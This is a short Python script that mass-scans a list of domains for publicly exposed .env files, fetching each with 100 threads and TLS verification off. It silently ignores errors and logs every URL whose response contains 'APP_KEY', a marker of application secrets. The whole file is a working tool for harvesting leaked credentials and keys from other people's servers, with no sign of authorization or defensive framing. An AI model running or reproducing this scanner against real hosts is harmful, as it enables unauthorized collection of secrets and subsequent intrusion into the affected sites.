#!/usr/bin/env python3

import sys
import requests
from multiprocessing.dummy import Pool
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    domains = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('Où est ta liste?')

def check(domain):
    try:
        url = 'https://' + domain + '/.env'
        r = requests.get(url, timeout=5, allow_redirects=False, verify=False)

        if r.status_code == 200 and "APP_KEY" in r.text:
            with open("env.txt", "a+") as f:
                print(url, file=f)

    except requests.RequestException:
        # just skip errors silently (no output)
        pass

mp = Pool(100)
mp.map(check, domains)
mp.close()
mp.join()
